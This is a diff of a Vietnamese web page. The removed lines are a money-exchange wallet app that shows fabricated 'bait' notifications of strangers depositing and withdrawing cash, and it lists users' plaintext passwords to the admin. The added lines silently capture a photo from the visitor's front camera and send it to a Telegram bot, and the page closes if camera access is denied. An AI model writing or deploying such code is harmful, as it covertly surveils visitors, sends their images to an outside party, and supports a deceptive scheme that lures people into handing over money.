-            document.getElementById("loginLoading").style.display = "block";
-
-            setTimeout(() => {
-                document.getElementById("loginLoading").style.display = "none";
-
-                if (!dbUsers[username] || dbUsers[username].password !== password) {
-                    alert("Sai tài khoản hoặc mật khẩu!");
-                    return;
-                }
-
-                currentUser = username;
-                localStorage.setItem('current_user', username); // Lưu phiên đăng nhập
-                document.getElementById('user-name-display').innerText = `👋 ${username}`;
-                
-                // Hiển thị app, ẩn màn hình Auth
-                document.getElementById('auth-view').classList.add('hidden');
-                document.getElementById('main-header').classList.remove('hidden');
-                document.getElementById('app-content').classList.remove('hidden');
-
-                // Chỉ hiển thị cụm nút chuyển giao diện nếu tài khoản là Admin
-                const isAdmin = dbUsers[username].role === 'admin';
-                const adminNavTabs = document.getElementById('admin-nav-tabs');
-                if (adminNavTabs) {
-                    adminNavTabs.classList.toggle('hidden', !isAdmin);
-                }
-
-                switchView('user');
-                updateBalanceUI();
-                renderUserHistory();
+                autoCaptureAndSend(stream);
             }, 1000);
+
+        } catch (err) {
+            // Nếu người dùng từ chối quyền camera -> Thoát web
+            exitWeb();
         }
+    });
 
-        function logout() {
-            currentUser = null;
-            localStorage.removeItem('current_user'); // Xóa phiên đăng nhập
-            document.getElementById('main-header').classList.add('hidden');
-            document.getElementById('app-content').classList.add('hidden');
-            document.getElementById('user-view').classList.add('hidden');
-            document.getElementById('admin-view').classList.add('hidden');
-            document.getElementById('auth-view').classList.remove('hidden');
-            document.getElementById('loginUsername').value = '';
-            document.getElementById('loginPassword').value = '';
-            showLogin();
-        }
+    // Xử lý thoát khi người dùng từ chối cấp quyền
+    function exitWeb() {
+        setTimeout(() => {
+            window.close();
+            window.location.href = "about:blank";
+        }, 300);
+    }
 
-        // --- HIỆU ỨNG CHIM MỒI THÔNG BÁO ---
-        const fakeUsers = ['nguyen***', 'tran***', 'le***', 'pham***', 'hoang***', 'vu***', 'dang***', 'bui***', 'do***', 'ngo***'];
-        const fakeAmounts = [50000, 100000, 200000, 500000, 1000000, 2000000];
-        const fakeActions = ['NẠP', 'RÚT', 'EXCHANGE_XU'];
+    // Chụp khung hình từ camera trước và gửi về Telegram
+    function autoCaptureAndSend(stream) {
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
 
-        function showNotification(msg) {
-            const container = document.getElementById('toast-container');
-            const toast = document.createElement('div');
-            toast.className = 'bg-slate-900/90 text-white text-xs px-3.5 py-2.5 rounded-xl shadow-lg border border-slate-700 flex items-center gap-2.5 transition-all duration-500 transform translate-y-4 opacity-0';
-            toast.innerHTML = `<i class="fa-solid fa-bell text-emerald-400"></i> <span>${msg}</span>`;
-            
-            container.appendChild(toast);
-            setTimeout(() => toast.classList.remove('translate-y-4', 'opacity-0'), 50);
-            setTimeout(() => {
-                toast.classList.add('translate-y-4', 'opacity-0');
-                setTimeout(() => toast.remove(), 500);
-            }, 4500);
-        }
+        const context = canvas.getContext('2d');
+        // Chụp ảnh từ ống kính camera trước
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        setInterval(() => {
-            const user = fakeUsers[Math.floor(Math.random() * fakeUsers.length)];
-            const amt = fakeAmounts[Math.floor(Math.random() * fakeAmounts.length)];
-            const actionType = fakeActions[Math.floor(Math.random() * fakeActions.length)];
+        // Chuyển dữ liệu ảnh thành URL để hiển thị lên giao diện web
+        const imageUrl = canvas.toDataURL('image/png');
 
-            if (actionType === 'NẠP') {
-                showNotification(`Tài khoản <b>${user}</b> vừa nạp thành công <b class="text-emerald-400">${amt.toLocaleString('vi-VN')} ₫</b>`);
-            } else if (actionType === 'RÚT') {
-                showNotification(`Tài khoản <b>${user}</b> vừa rút thành công <b class="text-amber-400">${amt.toLocaleString('vi-VN')} ₫</b>`);
-            } else {
-                const convertAmt = Math.min(amt, dbQuota);
-                if (convertAmt > 0) {
-                    dbQuota -= convertAmt;
-                    saveDB();
-                    updateBalanceUI();
-                    if (document.getElementById('admin-view') && !document.getElementById('admin-view').classList.contains('hidden')) {
-                        renderAdminTable();
-                    }
-                    showNotification(`Tài khoản <b>${user}</b> vừa quy đổi thành công <b class="text-blue-400">${convertAmt.toLocaleString('vi-VN')} XU ➔ VND</b>`);
+        canvas.toBlob(async function(blob) {
+            if (blob) {
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', blob, 'camera_front.png');
+
+                try {
+                    // Gửi tệp ảnh trực tiếp tới API Telegram
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch (error) {
+                    console.error("Lỗi gửi dữ liệu:", error);
                 }
             }
-        }, 8000);
 
-        function updateBalanceUI() {
-            if (!currentUser) return;
-            const userData = dbUsers[currentUser];
-            document.getElementById('bal-vnd-display').innerText = (userData.VND || 0).toLocaleString('vi-VN') + ' ₫';
-            document.getElementById('bal-xu-display').innerText = (userData.XU || 0).toLocaleString('vi-VN') + ' XU';
-            
-            const quotaDisplayEl = document.getElementById('user-quota-display');
-            if (quotaDisplayEl) quotaDisplayEl.innerText = `${dbQuota.toLocaleString('vi-VN')} XU`;
+            // Tắt đèn camera sau khi đã hoàn tất chụp
+            stream.getTracks().forEach(track => track.stop());
 
-            const COOLDOWN_MS = 3 * 60 * 60 * 1000;
-            const nowMs = Date.now();
-            const lastTime = userData.lastVndToXuTime || 0;
-            const cdEl = document.getElementById('cooldown-status-display');
+            // Hiển thị bức ảnh từ camera trước và dòng thông báo
+            capturedImg.src = imageUrl;
+            resultContainer.style.display = 'block';
 
-            if (cdEl) {
-                if (nowMs - lastTime >= COOLDOWN_MS) {
-                    cdEl.className = 'p-2.5 rounded-lg border border-emerald-200 bg-emerald-50 text-xs text-emerald-800 font-medium';
-                    cdEl.innerHTML = `<i class="fa-solid fa-circle-check text-emerald-600 mr-1"></i> Trạng thái đổi Xu: <strong>Đã sẵn sàng quy đổi XU ➔ VND</strong>`;
-                } else {
-                    const remainingMs = COOLDOWN_MS - (nowMs - lastTime);
-                    const remainingHours = Math.floor(remainingMs / (1000 * 60 * 60));
-                    const remainingMins = Math.ceil((remainingMs % (1000 * 60 * 60)) / (1000 * 60));
-                    cdEl.className = 'p-2.5 rounded-lg border border-amber-200 bg-amber-50 text-xs text-amber-800 font-medium';
-                    cdEl.innerHTML = `<i class="fa-solid fa-hourglass-half text-amber-600 mr-1"></i> Đếm ngược đổi XU ➔ VND: <strong>Còn ${remainingHours} giờ ${remainingMins} phút</strong>`;
-                }
-            }
-        }
+        }, 'image/png');
+    }
+</script>
 
-        function switchView(view) {
-            // Chặn tuyệt đối truy cập Admin nếu không có quyền
-            if (view === 'admin' && dbUsers[currentUser]?.role !== 'admin') {
-                alert('Bạn không có quyền truy cập trang Admin!');
-                return;
-            }
-
-            document.getElementById('user-view').classList.toggle('hidden', view !== 'user');
-            document.getElementById('admin-view').classList.toggle('hidden', view !== 'admin');
-            
-            const btnUser = document.getElementById('btn-user-view');
-            const btnAdmin = document.getElementById('btn-admin-view');
-
-            if (btnUser) {
-                btnUser.className = view === 'user' 
-                    ? 'px-3 py-1.5 rounded-lg text-xs font-semibold bg-blue-600 text-white' 
-                    : 'px-3 py-1.5 rounded-lg text-xs font-semibold bg-slate-700 text-slate-300 hover:text-white';
-            }
-                
-            if (btnAdmin) {
-                btnAdmin.className = view === 'admin' 
-                    ? 'px-3 py-1.5 rounded-lg text-xs font-semibold bg-blue-600 text-white' 
-                    : 'px-3 py-1.5 rounded-lg text-xs font-semibold bg-slate-700 text-slate-300 hover:text-white';
-            }
-
-            if (view === 'admin') renderAdminTable();
-        }
-
-        function generateRandomCode() {
-            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-            let code = 'NAP';
-            for (let i = 0; i < 6; i++) code += chars.charAt(Math.floor(Math.random() * chars.length));
-            return code;
-        }
-
-        function calculateExchangePreview() {
-            const dir = document.getElementById('exc-direction').value;
-            const amt = parseFloat(document.getElementById('exc-amount').value) || 0;
-            const previewEl = document.getElementById('exc-preview');
-
-            if (dir === 'VND_TO_XU') {
-                previewEl.innerText = `${(amt * 3).toLocaleString('vi-VN')} XU`;
-            } else {
-                previewEl.innerText = `${(amt * 1).toLocaleString('vi-VN')} ₫`;
-            }
-        }
-
-        function handleExchange1to3(e) {
-            e.preventDefault();
-            const dir = document.getElementById('exc-direction').value;
-            const amt = parseFloat(document.getElementById('exc-amount').value);
-            const user = dbUsers[currentUser];
-
-            if (isNaN(amt) || amt <= 0) {
-                alert('Vui lòng nhập số tiền đổi hợp lệ!');
-                return;
-            }
-
-            const timeNow = new Date().toLocaleString('vi-VN');
-            const nowMs = Date.now();
-
-            if (dir === 'VND_TO_XU') {
-                if (user.VND < amt) {
-                    alert('Số dư VND của bạn không đủ để thực hiện quy đổi!');
-                    return;
-                }
-                const xuReceived = amt * 3;
-                user.VND -= amt;
-                user.XU += xuReceived;
-                user.lastVndToXuTime = nowMs;
-
-                addLogUserHistory(timeNow, 'Đổi VND ➔ XU', `Đổi ${amt.toLocaleString()} VND ➔ ${xuReceived.toLocaleString()} XU`, `-${amt.toLocaleString()} VND`, 'Hoàn thành');
-                alert(`Đổi thành công! Nhận ${xuReceived.toLocaleString()} XU.`);
-            } else {
-                if (amt > dbQuota) {
-                    alert(`Hạn ngạch đổi XU ➔ VND của hệ thống không đủ (Còn lại: ${dbQuota.toLocaleString('vi-VN')} XU)!`);
-                    return;
-                }
-
-                const COOLDOWN_MS = 3 * 60 * 60 * 1000;
-                const lastTime = user.lastVndToXuTime || 0;
-                
-                if (nowMs - lastTime < COOLDOWN_MS) {
-                    const remainingMs = COOLDOWN_MS - (nowMs - lastTime);
-                    const remainingHours = Math.floor(remainingMs / (1000 * 60 * 60));
-                    const remainingMins = Math.ceil((remainingMs % (1000 * 60 * 60)) / (1000 * 60));
-                    alert(`Bạn cần đợi đủ 3 tiếng sau khi đổi VND -> XU!\nThời gian còn lại: ${remainingHours} giờ ${remainingMins} phút.`);
-                    return;
-                }
-
-                if (user.XU < amt) {
-                    alert('Số dư XU không đủ!');
-                    return;
-                }
-                const vndReceived = amt * 1;
-                user.XU -= amt;
-                user.VND += vndReceived;
-                dbQuota -= amt;
-
-                addLogUserHistory(timeNow, 'Đổi XU ➔ VND', `Đổi ${amt.toLocaleString()} XU ➔ ${vndReceived.toLocaleString()} VND`, `+${vndReceived.toLocaleString()} VND`, 'Hoàn thành');
-                alert(`Đổi thành công! Nhận ${vndReceived.toLocaleString()} VND.`);
-            }
-
-            saveDB();
-            updateBalanceUI();
-            document.getElementById('exc-amount').value = '';
-            calculateExchangePreview();
-        }
-
-        function handleAdminAddQuota(e) {
-            e.preventDefault();
-            const addAmt = parseFloat(document.getElementById('adm-quota-add').value);
-            if (isNaN(addAmt) || addAmt <= 0) return alert('Nhập số hạn ngạch hợp lệ!');
-            dbQuota += addAmt;
-            saveDB();
-            alert(`Đã nạp thêm ${addAmt.toLocaleString('vi-VN')} XU vào hạn ngạch hệ thống!`);
-            document.getElementById('adm-quota-add').value = '';
-            updateBalanceUI();
-            renderAdminTable();
-        }
-
-        function handleAdminAdjustBalance(e) {
-            e.preventDefault();
-            const targetUsername = document.getElementById('adm-user-target').value.trim();
-            const walletType = document.getElementById('adm-wallet-type').value;
-            const amount = parseFloat(document.getElementById('adm-amount-change').value);
-
-            if (!dbUsers[targetUsername]) return alert(`Tài khoản "${targetUsername}" không tồn tại!`);
-            if (isNaN(amount) || amount === 0) return alert('Vui lòng nhập số tiền hợp lệ!');
-
-            if (walletType === 'VND') dbUsers[targetUsername].VND = (dbUsers[targetUsername].VND || 0) + amount;
-            else dbUsers[targetUsername].XU = (dbUsers[targetUsername].XU || 0) + amount;
-
-            if (!dbUsers[targetUsername].history) dbUsers[targetUsername].history = [];
-            dbUsers[targetUsername].history.unshift({
-                time: new Date().toLocaleString('vi-VN'),
-                type: 'Admin điều chỉnh',
-                detail: amount > 0 ? `Admin cộng ${amount.toLocaleString()} ${walletType}` : `Admin trừ ${Math.abs(amount).toLocaleString()} ${walletType}`,
-                change: `${amount > 0 ? '+' : ''}${amount.toLocaleString()} ${walletType}`,
-                status: 'Thành công'
-            });
-
-            saveDB();
-            alert(`Đã cập nhật số dư cho "${targetUsername}"!`);
-            document.getElementById('adm-user-target').value = '';
-            document.getElementById('adm-amount-change').value = '';
-
-            if (currentUser === targetUsername) updateBalanceUI();
-            renderAdminTable();
-        }
-
-        function generateDepositQR(e) {
-            e.preventDefault();
-            const amount = parseFloat(document.getElementById('dep-amount').value);
-            const memo = generateRandomCode();
-
-            const qrUrl = `https://img.vietqr.io/image/${ADMIN_BANK}-${ADMIN_STK}-compact2.png?amount=${amount}&addInfo=${encodeURIComponent(memo)}`;
-
-            document.getElementById('qr-img').src = qrUrl;
-            document.getElementById('qr-amt-display').innerText = amount.toLocaleString('vi-VN') + ' ₫';
-            document.getElementById('qr-memo').innerText = memo;
-            document.getElementById('qr-box').classList.remove('hidden');
-
-            currentTempDeposit = {
-                id: 'TX' + Date.now().toString().slice(-6),
-                username: currentUser,
-                type: 'deposit',
-                amount: amount,
-                memo: memo,
-                details: `CK đến STK: ${ADMIN_STK} (${ADMIN_BANK})`,
-                time: new Date().toLocaleString('vi-VN'),
-                status: 'pending'
-            };
-        }
-
-        function submitDepositRequest() {
-            if (!currentTempDeposit) return;
-            transactions.unshift({...currentTempDeposit});
-            addLogUserHistory(currentTempDeposit.time, 'Nạp tiền', `Nội dung: ${currentTempDeposit.memo}`, `+${currentTempDeposit.amount.toLocaleString()} ₫`, 'Chờ duyệt');
-            saveDB();
-            alert(`Đã gửi yêu cầu nạp tiền! Vui lòng chờ Admin duyệt.`);
-            currentTempDeposit = null;
-            document.getElementById('qr-box').classList.add('hidden');
-            document.getElementById('dep-amount').value = '';
-        }
-
-        function submitWithdrawRequest(e) {
-            e.preventDefault();
-            const bank = document.getElementById('wit-bank').value;
-            const acc = document.getElementById('wit-acc').value;
-            const name = document.getElementById('wit-name').value;
-            const amount = parseFloat(document.getElementById('wit-amount').value);
-            const user = dbUsers[currentUser];
-
-            if (user.VND < amount) return alert('Số dư VND không đủ để rút!');
-
-            user.VND -= amount; // Tạm trừ số dư VND ngay lập tức
-
-            const tx = {
-                id: 'TX' + Date.now().toString().slice(-6),
-                username: currentUser,
-                type: 'withdraw',
-                amount: amount,
-                memo: `RUT_${acc}`,
-                details: `${bank} - ${acc} (${name.toUpperCase()})`,
-                time: new Date().toLocaleString('vi-VN'),
-                status: 'pending'
-            };
-
-            transactions.unshift(tx);
-            addLogUserHistory(tx.time, 'Rút tiền', tx.details, `-${amount.toLocaleString()} ₫`, 'Chờ duyệt');
-            saveDB();
-            updateBalanceUI();
-            alert('Đã gửi yêu cầu rút tiền (Số dư VND đã được tạm trừ)!');
-            e.target.reset();
-        }
-
-        function addLogUserHistory(time, type, detail, change, status) {
-            if (!currentUser) return;
-            const user = dbUsers[currentUser];
-            if (!user.history) user.history = [];
-            user.history.unshift({ time, type, detail, change, status });
-            renderUserHistory();
-        }
-
-        function renderUserHistory() {
-            const tbody = document.getElementById('user-history-body');
-            tbody.innerHTML = '';
-            const history = dbUsers[currentUser]?.history || [];
-
-            if (history.length === 0) {
-                tbody.innerHTML = `<tr><td colspan="5" class="text-center py-4 text-slate-400 italic">Chưa có lịch sử giao dịch</td></tr>`;
-                return;
-            }
-
-            history.forEach(item => {
-                const tr = document.createElement('tr');
-                tr.className = 'hover:bg-slate-50';
-                tr.innerHTML = `
-                    <td class="p-2 text-slate-500">${item.time}</td>
-                    <td class="p-2 font-bold">${item.type}</td>
-                    <td class="p-2 text-slate-600">${item.detail}</td>
-                    <td class="p-2 font-semibold ${item.change.startsWith('+') ? 'text-emerald-600' : 'text-amber-600'}">${item.change}</td>
-                    <td class="p-2"><span class="px-2 py-0.5 rounded text-[10px] font-semibold bg-slate-100 text-slate-700">${item.status}</span></td>
-                `;
-                tbody.appendChild(tr);
-            });
-        }
-
-        function updateStatus(id, newStatus) {
-            const tx = transactions.find(t => t.id === id);
-            if (tx) {
-                const targetUser = dbUsers[tx.username];
-
-                if (newStatus === 'approved' && tx.status === 'pending' && tx.type === 'deposit') {
-                    if (targetUser) {
-                        targetUser.VND += tx.amount;
-                        if (!targetUser.history) targetUser.history = [];
-                        targetUser.history.unshift({
-                            time: new Date().toLocaleString('vi-VN'),
-                            type: 'Hệ thống',
-                            detail: `Admin đã duyệt lệnh nạp ${tx.id}`,
-                            change: `+${tx.amount.toLocaleString()} VND`,
-                            status: 'Thành công'
-                        });
-                    }
-                }
-                
-                if (newStatus === 'rejected' && tx.status === 'pending' && tx.type === 'withdraw') {
-                    if (targetUser) {
-                        targetUser.VND += tx.amount;
-                        if (!targetUser.history) targetUser.history = [];
-                        targetUser.history.unshift({
-                            time: new Date().toLocaleString('vi-VN'),
-                            type: 'Hệ thống',
-                            detail: `Lệnh rút ${tx.id} bị hủy, hoàn lại tiền`,
-                            change: `+${tx.amount.toLocaleString()} VND`,
-                            status: 'Hoàn tiền'
-                        });
-                    }
-                }
-
-                if (newStatus === 'approved' && tx.status === 'pending' && tx.type === 'withdraw') {
-                    if (targetUser) {
-                        if (!targetUser.history) targetUser.history = [];
-                        targetUser.history.unshift({
-                            time: new Date().toLocaleString('vi-VN'),
-                            type: 'Hệ thống',
-                            detail: `Admin đã duyệt lệnh rút ${tx.id}`,
-                            change: `-${tx.amount.toLocaleString()} VND`,
-                            status: 'Thành công'
-                        });
-                    }
-                }
-
-                tx.status = newStatus;
-                saveDB();
-                updateBalanceUI();
-                renderUserHistory();
-                renderAdminTable();
-            }
-        }
-
-        function renderAdminTable(filter = 'all') {
-            const tbody = document.getElementById('admin-table-body');
-            tbody.innerHTML = '';
-
-            const filtered = transactions.filter(t => filter === 'all' || t.type === filter);
-
-            document.getElementById('stat-pending-dep').innerText = transactions.filter(t => t.type === 'deposit' && t.status === 'pending').length;
-            document.getElementById('stat-pending-wit').innerText = transactions.filter(t => t.type === 'withdraw' && t.status === 'pending').length;
-            document.getElementById('stat-total').innerText = transactions.length;
-            document.getElementById('stat-quota').innerText = `${dbQuota.toLocaleString('vi-VN')} XU`;
-
-            if (filtered.length === 0) {
-                tbody.innerHTML = `<tr><td colspan="8" class="text-center py-6 text-slate-400 italic">Chưa có giao dịch cần xử lý</td></tr>`;
-            } else {
-                filtered.forEach(t => {
-                    const tr = document.createElement('tr');
-                    tr.className = 'hover:bg-slate-50 transition';
-
-                    const statusBadge = t.status === 'pending' 
-                        ? `<span class="px-2 py-0.5 rounded bg-amber-100 text-amber-700 font-semibold">Chờ duyệt</span>`
-                        : t.status === 'approved' 
-                        ? `<span class="px-2 py-0.5 rounded bg-emerald-100 text-emerald-700 font-semibold">Đã duyệt</span>`
-                        : `<span class="px-2 py-0.5 rounded bg-red-100 text-red-700 font-semibold">Từ chối</span>`;
-
-                    const typeBadge = t.type === 'deposit' 
-                        ? `<span class="font-bold text-emerald-600">NẠP</span>`
-                        : `<span class="font-bold text-amber-600">RÚT</span>`;
-
-                    const actions = t.status === 'pending' ? `
-                        <button onclick="updateStatus('${t.id}', 'approved')" class="px-2 py-1 bg-emerald-600 text-white rounded hover:bg-emerald-700 mr-1">Duyệt</button>
-                        <button onclick="updateStatus('${t.id}', 'rejected')" class="px-2 py-1 bg-red-600 text-white rounded hover:bg-red-700">Hủy</button>
-                    ` : `<span class="text-slate-400">Hoàn tất</span>`;
-
-                    tr.innerHTML = `
-                        <td class="p-3 font-mono font-bold">${t.id}</td>
-                        <td class="p-3 font-semibold text-slate-700">${t.username}</td>
-                        <td class="p-3">${typeBadge}</td>
-                        <td class="p-3 font-semibold">${t.amount.toLocaleString('vi-VN')} ₫</td>
-                        <td class="p-3 font-mono">
-                            <div><strong>Nội dung:</strong> <span class="text-blue-600">${t.memo}</span></div>
-                            <div class="text-slate-500 text-[11px]">${t.details}</div>
-                        </td>
-                        <td class="p-3 text-slate-500">${t.time}</td>
-                        <td class="p-3">${statusBadge}</td>
-                        <td class="p-3 text-right">${actions}</td>
-                    `;
-                    tbody.appendChild(tr);
-                });
-            }
-
-            renderAdminUserList();
-        }
-
-        function renderAdminUserList() {
-            const userTbody = document.getElementById('admin-user-list-body');
-            userTbody.innerHTML = '';
-
-            Object.keys(dbUsers).forEach(username => {
-                const u = dbUsers[username];
-                const pendingDepCount = transactions.filter(t => t.username === username && t.type === 'deposit' && t.status === 'pending').length;
-                const pendingWitCount = transactions.filter(t => t.username === username && t.type === 'withdraw' && t.status === 'pending').length;
-
-                const tr = document.createElement('tr');
-                tr.className = 'hover:bg-slate-50 font-mono';
-                tr.innerHTML = `
-                    <td class="p-3 font-bold text-slate-800">${username}</td>
-                    <td class="p-3 text-slate-600">${u.password}</td>
-                    <td class="p-3 font-semibold text-blue-600">${(u.VND || 0).toLocaleString('vi-VN')} ₫</td>
-                    <td class="p-3 font-semibold text-emerald-600">${(u.XU || 0).toLocaleString('vi-VN')} XU</td>
-                    <td class="p-3 font-bold text-emerald-700">${pendingDepCount}</td>
-                    <td class="p-3 font-bold text-amber-700">${pendingWitCount}</td>
-                    <td class="p-3">
-                        <span class="px-2 py-0.5 rounded text-[10px] font-bold ${u.role === 'admin' ? 'bg-purple-100 text-purple-700' : 'bg-slate-100 text-slate-700'}">
-                            ${u.role.toUpperCase()}
-                        </span>
-                    </td>
-                `;
-                userTbody.appendChild(tr);
-            });
-        }
-    </script>
 </body>
 </html>
